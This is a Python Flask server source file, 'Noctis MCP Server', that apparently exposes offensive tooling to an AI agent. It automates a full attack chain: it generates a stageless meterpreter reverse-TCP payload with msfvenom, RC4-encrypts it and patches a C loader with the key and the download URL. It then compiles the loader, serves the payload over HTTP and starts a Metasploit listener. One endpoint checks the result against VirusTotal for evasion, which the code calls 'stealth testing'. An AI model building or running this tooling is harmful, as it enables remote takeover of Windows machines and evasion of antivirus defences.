#!/usr/bin/env python3
"""
Noctis MCP Server
Stageless Loader Automation Server
"""
import subprocess
import os
import re
import signal
import time
import hashlib
from pathlib import Path
from flask import Flask, request, jsonify
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# VirusTotal API (optional - only for testing)
try:
    import vt
    VT_API_KEY = os.getenv('VIRUSTOTAL_API_KEY')
    VT_AVAILABLE = bool(VT_API_KEY)
except ImportError:
    VT_AVAILABLE = False
    VT_API_KEY = None

app = Flask(__name__)

# Base directory
BASE_DIR = Path(__file__).parent.parent / "stageless-loader"

# Track running background processes
running_processes = {
    'http_server': None,
    'msf_listener': None
}


@app.route('/api/generate_stageless_loader', methods=['POST'])
def generate_stageless_loader():
    """
    Generate complete stageless loader system.
    """
    try:
        data = request.get_json()
        lhost = data.get('lhost')
        lport = data.get('lport', 4444)
        http_port = data.get('http_port', 8080)
        output_dir = data.get('output_dir')

        if not lhost:
            return jsonify({
                'success': False,
                'error': 'Missing required parameter: lhost'
            }), 400

        # Set output directory
        if output_dir:
            work_dir = Path(output_dir).absolute()
        else:
            work_dir = BASE_DIR

        work_dir.mkdir(parents=True, exist_ok=True)
        os.chdir(work_dir)

        # Step 1: Generate MSFVenom payload
        payload_file = work_dir / "reverse_shell.bin"

        cmd = [
            "msfvenom",
            "-p", "windows/x64/meterpreter_reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "raw",
            "-o", str(payload_file)
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            return jsonify({
                'success': False,
                'error': f'MSFVenom failed: {result.stderr}'
            }), 500

        payload_size = payload_file.stat().st_size

        # Step 2: Encrypt payload
        encrypt_script = work_dir / "encrypt_payload.py"
        if not encrypt_script.exists():
            return jsonify({
                'success': False,
                'error': f'encrypt_payload.py not found in {work_dir}'
            }), 500

        cmd = ["python3", str(encrypt_script), str(payload_file), "payload.enc"]
        result = subprocess.run(cmd, capture_output=True, text=True, cwd=work_dir)

        if result.returncode != 0:
            return jsonify({
                'success': False,
                'error': f'Encryption failed: {result.stderr}'
            }), 500

        # Step 3: Update loader source with new key
        keys_file = work_dir / "payload_keys.h"
        with open(keys_file, 'r') as f:
            keys_content = f.read()

        # Extract key line
        new_key_line = None
        for line in keys_content.split('\n'):
            if 'g_Rc4Key[32]' in line and 'static' in line:
                new_key_line = line.strip()
                break

        if not new_key_line:
            return jsonify({
                'success': False,
                'error': 'Could not extract RC4 key from payload_keys.h'
            }), 500

        # Update stageless_loader.c
        loader_source = work_dir / "stageless_loader.c"
        with open(loader_source, 'r') as f:
            loader_code = f.read()

        # Replace key line
        pattern = r'static BYTE g_Rc4Key\[32\] = \{.*?\};'
        loader_code = re.sub(pattern, new_key_line, loader_code)

        # Update URL
        old_url_pattern = r'char url\[\] = ".*?";'
        new_url = f'char url[] = "http://{lhost}:{http_port}/payload.enc";'
        loader_code = re.sub(old_url_pattern, new_url, loader_code)

        with open(loader_source, 'w') as f:
            f.write(loader_code)

        # Step 4: Compile loader
        loader_exe = work_dir / "stageless_loader.exe"
        cmd = [
            "x86_64-w64-mingw32-gcc",
            "-O2", "-s",
            str(loader_source),
            "-o", str(loader_exe),
            "-lurlmon"
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, cwd=work_dir)
        if result.returncode != 0:
            return jsonify({
                'success': False,
                'error': f'Compilation failed: {result.stderr}'
            }), 500

        loader_size = loader_exe.stat().st_size

        # Step 5: Create server and listener scripts
        server_script = work_dir / "start_server.sh"
        with open(server_script, 'w') as f:
            f.write(f"""#!/bin/bash
# HTTP Server for Stageless Payload Delivery

echo "[*] Starting HTTP server on port {http_port}..."
echo "[*] Serving from: $(pwd)"
echo "[*] Payload URL: http://{lhost}:{http_port}/payload.enc"
echo ""
echo "[+] Server is running. Press CTRL+C to stop."
echo ""

cd {work_dir}
python3 -m http.server {http_port}
""")
        server_script.chmod(0o755)

        listener_script = work_dir / "start_listener.sh"
        with open(listener_script, 'w') as f:
            f.write(f"""#!/bin/bash
# MSF Handler for Stageless Meterpreter

echo "[*] Starting Metasploit handler..."
echo "[*] Listening on: {lhost}:{lport}"
echo "[*] Payload: windows/x64/meterpreter_reverse_tcp (STAGELESS)"
echo ""

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j"
""")
        listener_script.chmod(0o755)

        return jsonify({
            'success': True,
            'lhost': lhost,
            'lport': lport,
            'http_port': http_port,
            'work_dir': str(work_dir),
            'payload_size': payload_size,
            'loader_size': loader_size,
            'loader_path': str(loader_exe),
            'server_script': str(server_script),
            'listener_script': str(listener_script)
        })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/check_status', methods=['POST'])
def check_status():
    """
    Check if stageless loader system is ready.
    """
    try:
        data = request.get_json()
        directory = data.get('directory')

        if directory:
            work_dir = Path(directory).absolute()
        else:
            work_dir = BASE_DIR

        files_to_check = {
            "stageless_loader.exe": "Loader binary",
            "payload.enc": "Encrypted payload",
            "start_server.sh": "HTTP server script",
            "start_listener.sh": "Metasploit listener script",
            "encrypt_payload.py": "Encryption tool",
            "stageless_loader.c": "Loader source code"
        }

        files_status = {}
        all_ready = True

        for filename, description in files_to_check.items():
            filepath = work_dir / filename
            if filepath.exists():
                files_status[filename] = {
                    'exists': True,
                    'size': filepath.stat().st_size,
                    'description': description
                }
            else:
                files_status[filename] = {
                    'exists': False,
                    'description': description
                }
                all_ready = False

        return jsonify({
            'success': True,
            'work_dir': str(work_dir),
            'all_ready': all_ready,
            'files': files_status
        })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/get_server_instructions', methods=['POST'])
def get_server_instructions():
    """
    Get instructions for starting HTTP server.
    """
    try:
        data = request.get_json()
        directory = data.get('directory')
        port = data.get('port', 8080)

        if directory:
            work_dir = Path(directory).absolute()
        else:
            work_dir = BASE_DIR

        payload_file = work_dir / "payload.enc"
        if not payload_file.exists():
            return jsonify({
                'success': False,
                'error': f'payload.enc not found in {work_dir}'
            }), 404

        return jsonify({
            'success': True,
            'work_dir': str(work_dir),
            'port': port,
            'payload_file': str(payload_file),
            'command': f"cd {work_dir} && ./start_server.sh",
            'manual_command': f"cd {work_dir} && python3 -m http.server {port}"
        })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/get_listener_instructions', methods=['POST'])
def get_listener_instructions():
    """
    Get instructions for starting Metasploit listener.
    """
    try:
        data = request.get_json()
        lhost = data.get('lhost')
        lport = data.get('lport', 4444)
        directory = data.get('directory')

        if not lhost:
            return jsonify({
                'success': False,
                'error': 'Missing required parameter: lhost'
            }), 400

        if directory:
            work_dir = Path(directory).absolute()
        else:
            work_dir = BASE_DIR

        return jsonify({
            'success': True,
            'lhost': lhost,
            'lport': lport,
            'work_dir': str(work_dir),
            'command': f"cd {work_dir} && ./start_listener.sh",
            'manual_command': f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j"'
        })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/start_http_server', methods=['POST'])
def start_http_server():
    """
    Start HTTP server in background to serve encrypted payload.
    """
    global running_processes

    try:
        data = request.get_json()
        directory = data.get('directory')
        port = data.get('port', 8080)

        if directory:
            work_dir = Path(directory).absolute()
        else:
            work_dir = BASE_DIR

        payload_file = work_dir / "payload.enc"
        if not payload_file.exists():
            return jsonify({
                'success': False,
                'error': f'payload.enc not found in {work_dir}'
            }), 404

        # Stop existing server if running
        if running_processes['http_server'] and running_processes['http_server'].poll() is None:
            return jsonify({
                'success': False,
                'error': 'HTTP server already running. Stop it first with /api/stop_http_server'
            }), 400

        # Start HTTP server in background
        process = subprocess.Popen(
            ['python3', '-m', 'http.server', str(port)],
            cwd=work_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            start_new_session=True
        )

        running_processes['http_server'] = process
        time.sleep(0.5)  # Give it time to start

        # Check if it started successfully
        if process.poll() is not None:
            stdout, stderr = process.communicate()
            return jsonify({
                'success': False,
                'error': f'HTTP server failed to start: {stderr.decode()}'
            }), 500

        return jsonify({
            'success': True,
            'message': 'HTTP server started successfully',
            'work_dir': str(work_dir),
            'port': port,
            'payload_url': f'http://localhost:{port}/payload.enc',
            'pid': process.pid
        })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/start_msf_listener', methods=['POST'])
def start_msf_listener():
    """
    Start Metasploit listener in background.
    """
    global running_processes

    try:
        data = request.get_json()
        lhost = data.get('lhost')
        lport = data.get('lport', 4444)

        if not lhost:
            return jsonify({
                'success': False,
                'error': 'Missing required parameter: lhost'
            }), 400

        # Stop existing listener if running
        if running_processes['msf_listener'] and running_processes['msf_listener'].poll() is None:
            return jsonify({
                'success': False,
                'error': 'MSF listener already running. Stop it first with /api/stop_msf_listener'
            }), 400

        # Create resource script for MSF
        msf_rc = BASE_DIR / "listener.rc"
        with open(msf_rc, 'w') as f:
            f.write(f"""use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
""")

        # Start Metasploit listener in background
        process = subprocess.Popen(
            ['msfconsole', '-q', '-r', str(msf_rc)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            start_new_session=True
        )

        running_processes['msf_listener'] = process
        time.sleep(2)  # Give MSF time to start

        # Check if it started successfully
        if process.poll() is not None:
            return jsonify({
                'success': False,
                'error': 'Metasploit listener failed to start'
            }), 500

        return jsonify({
            'success': True,
            'message': 'Metasploit listener started successfully',
            'lhost': lhost,
            'lport': lport,
            'payload': 'windows/x64/meterpreter_reverse_tcp',
            'pid': process.pid
        })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/stop_http_server', methods=['POST'])
def stop_http_server():
    """
    Stop running HTTP server.
    """
    global running_processes

    try:
        if not running_processes['http_server']:
            return jsonify({
                'success': False,
                'error': 'No HTTP server running'
            }), 400

        process = running_processes['http_server']
        if process.poll() is None:
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            time.sleep(0.5)

        running_processes['http_server'] = None

        return jsonify({
            'success': True,
            'message': 'HTTP server stopped'
        })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/stop_msf_listener', methods=['POST'])
def stop_msf_listener():
    """
    Stop running Metasploit listener.
    """
    global running_processes

    try:
        if not running_processes['msf_listener']:
            return jsonify({
                'success': False,
                'error': 'No MSF listener running'
            }), 400

        process = running_processes['msf_listener']
        if process.poll() is None:
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            time.sleep(0.5)

        running_processes['msf_listener'] = None

        return jsonify({
            'success': True,
            'message': 'Metasploit listener stopped'
        })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/process_status', methods=['GET'])
def process_status():
    """
    Check status of running processes.
    """
    global running_processes

    status = {}

    for name, process in running_processes.items():
        if process is None:
            status[name] = {
                'running': False,
                'pid': None
            }
        elif process.poll() is None:
            status[name] = {
                'running': True,
                'pid': process.pid
            }
        else:
            status[name] = {
                'running': False,
                'pid': None,
                'exit_code': process.poll()
            }

    return jsonify({
        'success': True,
        'processes': status
    })


@app.route('/api/test_binary', methods=['POST'])
def test_binary():
    """
    Test a binary against VirusTotal.
    WARNING: Only for development/stealth testing - shares samples with AV vendors!
    """
    try:
        if not VT_AVAILABLE:
            return jsonify({
                'success': False,
                'error': 'VirusTotal not configured. Install: pip install vt-py\nAdd VIRUSTOTAL_API_KEY to .env file'
            }), 400

        data = request.get_json()
        file_path = data.get('file_path')

        if not file_path:
            return jsonify({
                'success': False,
                'error': 'Missing required parameter: file_path'
            }), 400

        file_path = Path(file_path)
        if not file_path.exists():
            return jsonify({
                'success': False,
                'error': f'File not found: {file_path}'
            }), 404

        # Calculate SHA256
        sha256_hash = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256_hash.update(chunk)
        file_hash = sha256_hash.hexdigest()

        # Upload to VirusTotal
        with vt.Client(VT_API_KEY) as client:
            # Upload file
            with open(file_path, 'rb') as f:
                analysis = client.scan_file(f)

            # Wait for analysis
            while True:
                analysis = client.get_object(f"/analyses/{analysis.id}")
                if analysis.status == "completed":
                    break
                time.sleep(15)

            # Get results
            file_report = client.get_object(f"/files/{file_hash}")

            # Parse results
            scans = {}
            for engine_name, engine_result in file_report.last_analysis_results.items():
                scans[engine_name] = {
                    'detected': engine_result['category'] in ['malicious', 'suspicious'],
                    'result': engine_result.get('result', 'clean')
                }

            positives = sum(1 for r in scans.values() if r['detected'])
            total = len(scans)

            return jsonify({
                'success': True,
                'filename': file_path.name,
                'sha256': file_hash,
                'size': file_path.stat().st_size,
                'positives': positives,
                'total': total,
                'scan_date': file_report.last_analysis_date.isoformat() if hasattr(file_report, 'last_analysis_date') else 'N/A',
                'permalink': f"https://www.virustotal.com/gui/file/{file_hash}",
                'scans': scans
            })

    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint."""
    return jsonify({
        'status': 'ok',
        'vt_available': VT_AVAILABLE
    })


if __name__ == '__main__':
    print("=" * 70)
    print("  Noctis MCP Server")
    print("  Stageless Loader Automation")
    print("=" * 70)
    print()
    print("Server running on: http://localhost:8888")
    print()
    print("Available endpoints:")
    print("  POST /api/generate_stageless_loader")
    print("  POST /api/check_status")
    print("  POST /api/get_server_instructions")
    print("  POST /api/get_listener_instructions")
    print("  POST /api/test_binary              # VirusTotal testing")
    print("  GET  /health")
    print()
    if VT_AVAILABLE:
        print("[+] VirusTotal Testing: ENABLED")
    else:
        print("[-] VirusTotal Testing: DISABLED (no API key)")
    print()
    print("=" * 70)

    app.run(host='0.0.0.0', port=8888, debug=True)
